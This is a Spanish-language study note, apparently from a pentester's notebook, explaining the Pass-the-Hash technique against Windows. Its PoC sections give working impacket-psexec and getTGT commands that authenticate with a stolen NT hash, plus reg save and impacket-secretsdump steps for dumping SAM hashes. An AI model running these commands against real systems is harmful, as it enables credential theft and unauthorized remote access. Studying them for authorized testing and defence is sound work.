----
- Tags: #teoria #practica #windows #basico 
- ------
# Pass The Hash (PTH)
### **Pass The Hash** es una técnica utilizada por los a tacntes en la qeu se aprovechan de un hash de contraseña robado en lugar de la contraseña en texto claro para aunteticarse en un sistema o red. En lugar de descifrar la contraseña real, los atacntes toman el hash de contraseña y lo utilizan como una credencial para accceder a sistemas y recursos sin conocer la contraseña real del usuario.

- ### **Obtención del Hash NT**: El atacante primero necesita robar o adquirir de alguna manera el **Hash NT** de una cuenta de usuario. Esto puede hacerse mediante ataques previos, como ataques de captura de tráfico, [[Kerberoasting Attack]], o explotando vulnerabilidades en sistemas o aplicaciones.

- ### **Uso de Hash NT**: Una vez que el atacante tiene el Hash NT, puede utilizarlo para autenticarse en sistemas y recursos. El sistema o el servidor de destino calcula el hash de la contraesña proporcionado por el atacante y lo compara con el hash robado. Si coinciden, se conocede el acceso sin necesidad de conocer la contraseña real.

- ### **Acceso no autorizado**: Con el Hash NT correcot, el atacante puede obtener acceso no autorizado a sistemas, aplicaciones y recursos que normalmente requerirían una autenticación válida. Esto puede incluir servidores, base de datos, recursos compartidos a nivel de red y otros sistemas críticos.

----
# PoC
### Por ejemplo, supongamos que logramos obtener el Hash NT del usuario Administrador, haciendo uso de la suite de impacket, con herramientas como **imapcket-psexec**

```bash
# Una vez obtenido un Hash NT, ejemplo: 
"aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00"

# Ambas maneras son validas para llevar a cabo el Pass The Hash
impacket-psexec WORKGROUP/{Administrator}@{target_ip} -hashes :e0fb1fb85756c24235ff238cbe81fe00
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@{target_ip}
```
### De esta manera nos podríamos autenticar como el usuario administrador en la máquina windows sin proporcionar contraseña ya que en lugar de esta proporcionamos el **hash NTLM**. 

### Otro ejemplo, es realizar una petición de un TGT, lo que nos permite continuar con el flujo normal de [[Kerberos]] (Gráfico de autenticación: [[KERBEROS_AUTHETICATION_FLOW]]), para obtener acceso a un servicio específico.

```bash
impacket-getTGT {dc}/{username} -hashes :{Hash_NT}

export KRB5CCNAME={path/to/username.ccache/downloaded}

impacket-psexec {dc}/{username}@{ip} -k -no-pass
```
### Obteniendo así, una vez más, la [[RCE - (Remote Command Execution)]].

------
# PoC para obtener hashes NT 

### Por ejemplo, para realizar un **Pass The Hash** en caso de que tengamos privilegios y poder así intentar escalar los mismos, podríamos hacer uso de la herramienta **impacket-secretsdump** junto al archivo *system* y *sam* del sistema víctima. 

### La herramienta **impacket-secretsdump** es una herramienta utilizada para extrar y mostrar informacio´n relacionada con las credenciales y secretos almacenados en un sistema Windows. (Volcado de Hashes NTLM, extracción de credenciales almancenadas, extracción sobre cuentas de usuarios y grupos, mostrar información sobre servicios y volcado de información del registros de seguridad).

### El archivo **system** es un archivo del registro de Windows que contiene información sobre la configuración y ajustes del sistema, así como detalles sobre los controladores de dispositivos y la configuración del hardware. 

### El archivo **sam (Security Accounts Manager)** es un archivo del registro de Windows, que contiene las cuentas de usuario y las claves de seguridad relacionadas con la autenticación en el sistema.

#### En la máquina victima:
```shell
reg save HKLM\system system
reg save HKLM\sam sam 

# HKLM = HKEY_LOCAL_MACHINE (Una clave de raíz del Registro Windows)
```
### Con la instrucción **reg save** estamos creando una copia de seguridad del contenido del archivo **system** y del archivo **sam**, para posteriormente descargarlo a nuestra máquina y así poder dumpear los hashes NT para realizar un **Pass The Hash**. 

#### En la máquina atacante:
```bash
impacket-secretsdump -sam {sam_file} -system {system_file} LOCAL
```
### Una vez ejecutado este comando, obtendremos una lista de todos los hashes NT de los usuarios registrados en la máquina victima. 

#### IMPORTATE: Es importante tener en cuenta que esto volcará los hashes almacenados en la máquina, por lo que si estamos en un entorno de Active Directory hay que entender que no se estan volcando los hashes NT del Domain Controler. Para obtener los hashes de los usuarios del dominio de Active Directory habría que enfocarse en el archivo **NTDS.dit**. 

